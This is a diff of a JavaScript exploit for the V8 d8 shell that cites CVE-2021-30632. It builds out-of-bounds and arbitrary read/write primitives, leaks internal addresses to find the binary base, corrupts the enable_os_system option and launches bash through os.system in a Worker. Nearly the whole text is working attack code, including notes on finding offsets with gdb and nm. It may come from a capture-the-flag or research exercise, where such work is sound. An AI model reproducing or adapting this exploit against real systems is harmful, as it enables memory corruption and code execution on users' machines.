@@ -1,9 +1,3 @@
-var code = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3, 130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131, 128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128, 128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97, 105, 110, 0, 0, 10, 138, 128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 42, 11]);
-var module = new WebAssembly.Module(code);
-var instance = new WebAssembly.Instance(module);
-var main = instance.exports.main;
-
-
 function foo(y) {
   x = y;
 }
@@ -45,28 +39,35 @@ var view = new ArrayBuffer(24);
 var dblArr = new Float64Array(view);
 var intView = new Int32Array(view);
 var bigIntView = new BigInt64Array(view);
-b[0] = instance;
 var addrs = oobRead();
 
 function ftoi32(f) {
-  dblArr[0] = f;
-  return [intView[0], intView[1]];
+	buf = new ArrayBuffer(24);
+	view = new DataView(buf);
+  view.setFloat64(0, f, true); // little-endian
+  return [view.getInt32(0, true), view.getInt32(4, true)];
 }
 
-function i32tof(i1, i2) {
-  intView[0] = i1;
-  intView[1] = i2;
-  return dblArr[0];
+function i32tof(low, high) {
+	buf = new ArrayBuffer(24);
+	view = new DataView(buf);
+  view.setInt32(0, low, true);   // offset 0
+  view.setInt32(4, high, true);  // offset 4
+  return view.getFloat64(0, true);
 }
 
 function itof(i) {
-  bigIntView = BigInt(i);
-  return dblArr[0];
+	buf = new ArrayBuffer(24);
+	view = new DataView(buf);
+  view.setBigInt64(0, i, true); // little-endian
+  return view.getFloat64(0, true);
 }
 
 function ftoi(f) {
-  dblArr[0] = f;
-  return bigIntView[0];
+	buf = new ArrayBuffer(24);
+	view = new DataView(buf);
+  view.setFloat64(0, f, true); // little-endian
+  return view.getBigInt64(0, true);
 }
 
 
@@ -80,92 +81,104 @@ function addrOf(obj) {
   return intView[1]; 
 }
 
+var isBad = false;
+
+// addr: compact address
+// return value: 64-bit floating point value
 function arbRead(addr) {
-  [elements, addr1] = ftoi32(addrs[1]);
-  oobWrite(i32tof(addr,addr1));
+  if (isBad) {
+    [addr1, elements] = ftoi32(addrs[1]);
+    oobWrite(i32tof(addr1,addr));
+  } else {
+    [elements, addr1] = ftoi32(addrs[1]);
+    oobWrite(i32tof(addr,addr1));
+  }
   return writeArr[0];
 }
 
-function writeShellCode(rwxAddr, shellArr) {
-  var intArr = new Uint8Array(400);
-  var intArrAddr = addrOf(intArr);
-  // console.log("intArray addr: " + intArrAddr.toString(16));
-  var intBackingStore = ftoi(arbRead(intArrAddr + 0x20));
-  // console.log("intBackingStore: " + ftoi(arbRead(intArrAddr + 0x20)).toString(16));
+// addr: compact address
+// val: 64-bit floating point value
+function arbWrite(addr, val) {
+  if (isBad) {
+    [addr1, elements] = ftoi32(addrs[1]);
+    oobWrite(i32tof(addr1, addr));
+  } else {
+    [elements, addr1] = ftoi32(addrs[1]);
+    oobWrite(i32tof(addr, addr1));
+  }
+  writeArr[0] = val;
+}
 
-  var intArrMapAddr = ftoi(arbRead(intArrAddr - 0x08 + 0x00));
-  // console.log("intArrMapAddr: " + intArrMapAddr.toString(16));
-  intArrMapAddr = intArrMapAddr & BigInt(0xFFFFFFFF);
-  // console.log("intArrMapAddr: " + intArrMapAddr.toString(16));
-  intArrMapAddr = Number(intArrMapAddr);
+var elementsAddr = ftoi32(addrs[1])[0];
+if (elementsAddr == 0x800222d) {
+  print("bad address, but it is OK");
+  isBad = true;
+}
 
-  var mapConstructorAddr = ftoi(arbRead(intArrMapAddr - 0x08 + 0x14));
-  // console.log("mapConstructorAddr: " + mapConstructorAddr.toString(16));
-  mapConstructorAddr = mapConstructorAddr & BigInt(0xFFFFFFFF);
-  // console.log("mapConstructorAddr: " + mapConstructorAddr.toString(16));
-  mapConstructorAddr = Number(mapConstructorAddr);
+//----------------------------------------------------
+// Use CVE-2021-30632 to corrupt options->enable_os_system.
+var badVal = [0x1]
 
-  var constructorMapAddr = ftoi(arbRead(mapConstructorAddr - 0x08 + 0x00));
-  // console.log("constructorMapAddr: " + constructorMapAddr.toString(16));
-  constructorMapAddr = constructorMapAddr & BigInt(0xFFFFFFFF);
-  // console.log("constructorMapAddr: " + constructorMapAddr.toString(16));
-  constructorMapAddr = Number(constructorMapAddr);
+var intArr = new Uint8Array(400);
+var intArrAddr = addrOf(intArr);
+console.log("intArray addr: " + intArrAddr.toString(16));
+//var intBackingStore = ftoi(arbRead(intArrAddr + 0x20));
+//console.log("intBackingStore: " + ftoi(arbRead(intArrAddr + 0x20)).toString(16));
 
-  var instanceDescriptors = ftoi(arbRead(constructorMapAddr - 0x08 + 0x18));
-  // console.log("instanceDescriptors: " + instanceDescriptors.toString(16));
-  instanceDescriptors = instanceDescriptors & BigInt(0xFFFFFFFF);
-  // console.log("instanceDescriptors: " + instanceDescriptors.toString(16));
-  instanceDescriptors = Number(instanceDescriptors);
+var intArrMapAddr = ftoi32(arbRead(intArrAddr - 0x08 + 0x00))[0];
+console.log("intArrMapAddr: " + intArrMapAddr.toString(16));
+var mapConstructorAddr = ftoi32(arbRead(intArrMapAddr - 0x08 + 0x14))[0];
+console.log("mapConstructorAddr: " + mapConstructorAddr.toString(16));
+var constructorMapAddr = ftoi32(arbRead(mapConstructorAddr - 0x08 + 0x00))[0];
+console.log("constructorMapAddr: " + constructorMapAddr.toString(16));
+var instanceDescriptors = ftoi32(arbRead(constructorMapAddr - 0x08 + 0x18))[0];
+console.log("instanceDescriptors: " + instanceDescriptors.toString(16));
+var propertyLength = ftoi32(arbRead(instanceDescriptors - 0x08 + 0x18))[0];
+console.log("propertyLength: " + propertyLength.toString(16));
+var lengthSetter = ftoi32(arbRead(propertyLength - 0x08 + 0x10))[0];
+console.log("lengthSetter: " + lengthSetter.toString(16));
+var foreignAddress = ftoi(arbRead(lengthSetter - 0x08 + 0x04));
+console.log("foreignAddress: " + foreignAddress.toString(16));
+foreignAddress = Number(foreignAddress);
 
-  var propertyLength = ftoi(arbRead(instanceDescriptors - 0x08 + 0x18));
-  // console.log("propertyLength: " + propertyLength.toString(16));
-  propertyLength = propertyLength & BigInt(0xFFFFFFFF);
-  console.log('[+] Exploited! Run bash without --enable-os-system');
-  propertyLength = Number(propertyLength);
+// offsets of `foreign_address` with the binary
+// obtained this way:
+//    1. disable ASLR
+//    2. run d8 within gdb
+//    3. vmmap to find the binary load address
+//    4. use foreignAddress - load base address
+var loadBaseAddr = foreignAddress - 0x8eff10;
+console.log("binary load address: " + loadBaseAddr.toString(16));
 
-  var lengthSetter = ftoi(arbRead(propertyLength - 0x08 + 0x10));
-  // console.log("lengthSetter: " + lengthSetter.toString(16));
-  lengthSetter = lengthSetter & BigInt(0xFFFFFFFF);
-  // console.log("lengthSetter: " + lengthSetter.toString(16));
-  lengthSetter = Number(lengthSetter);
+// offset of "v8::Shell::options" or "_ZN2v85Shell7optionsE"
+// obtained by "nm d8 | grep _ZN2v85Shell7optionsE"
+var optionAddr = loadBaseAddr + 0x16ee438;
+console.log("optionAddr: " + optionAddr.toString(16));
 
-  var foreignAddress = ftoi(arbRead(lengthSetter - 0x08 + 0x04));
-  // console.log("foreignAddress: " + foreignAddress.toString(16));
-  foreignAddress = Number(foreignAddress);
+// offset of enableOsSystem within v8::Shell::options
+// obtained this way:
+//    1. compile one version with debug info
+//    2. load it with gdb
+//    3. print &((v8::ShellOptions*)0)->enable_os_system
+var enableOsSystem = optionAddr + 0x238 + 0x8;    // why +0x8, not sure
+console.log("enableOsSystem: " + enableOsSystem.toString(16));
 
-  // offsets from `foreign_address` to `options.enable_os_system`
-  var optionAddr = foreignAddress + 0xdf48b0 + 0x9958 + 0x238;
-  // console.log("optionAddr: " + optionAddr.toString(16));
-  enableOsSystem = optionAddr + 0x8;
-  // console.log("enableOsSystem: " + enableOsSystem.toString(16));
+rwxAddr = itof(BigInt(enableOsSystem));
+console.log("rwxAddr: ", ftoi(rwxAddr).toString(16));
 
-  enableOsSystem = BigInt(enableOsSystem);
-  var highAddr = enableOsSystem >> BigInt(32);
-  // console.log("highAddr: " + highAddr.toString(16));
-  var lowAddr = enableOsSystem & BigInt(0xFFFFFFFF);
-  // console.log("lowAddr: " + lowAddr.toString(16));
-  rwxAddr = i32tof(Number(lowAddr), Number(highAddr));
-  // console.log("rwxAddr: ", ftoi(rwxAddr).toString(16));
-
+if (isBad) {
+  [addr1, elements] = ftoi32(addrs[1]);
+  oobWrite(i32tof(addr1, intArrAddr + 0x20));
+} else {
   [elements, addr1] = ftoi32(addrs[1]);
   oobWrite(i32tof(intArrAddr + 0x20, addr1));
-  writeArr[0] = rwxAddr;
-  for (let i = 0; i < shellArr.length; i++) {
-    intArr[i] = shellArr[i];
-  }
 }
-// Use CVE-2021-30632 to corrupt options->enable_os_system.
+writeArr[0] = rwxAddr;
+for (let i = 0; i < badVal.length; i++) {
+  intArr[i] = badVal[i];
+}
 
-var instanceAddr = addrOf(instance);
-var elementsAddr = ftoi32(addrs[1])[0];
-var rwxAddr = arbRead(instanceAddr + 0x60);
+console.log('[+] Exploited! Run bash without --enable-os-system');
 
-var shellCode = [0x1]
-
-writeShellCode(rwxAddr, shellCode);
-
-main();
-
-var workerScript = `os.system("bash")`;
+var workerScript = `os.system("bash", ["-norc"])`;
 var worker = new Worker(workerScript, {type: 'string'});
-
